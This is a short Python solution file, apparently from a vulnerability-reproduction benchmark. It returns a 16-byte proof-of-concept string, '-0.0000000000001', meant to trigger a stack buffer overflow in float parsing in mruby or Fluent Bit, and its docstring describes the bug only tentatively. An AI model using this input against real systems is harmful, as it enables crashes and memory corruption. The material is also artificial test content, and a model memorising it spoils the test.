import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability description matches a stack buffer overflow in floating point number parsing
        (specifically in mruby's mrb_str_to_dbl or similar implementations like in Fluent Bit).
        The bug occurs when a leading minus sign is present, the parser advances the pointer,
        checks for "infinity", fails, and then proceeds to copy the number into a stack buffer
        (likely of size 16 or small size) with an incorrect offset or length calculation.
        
        A 16-byte valid float string starting with '-' triggers this.
        """
        return b"-0.0000000000001"
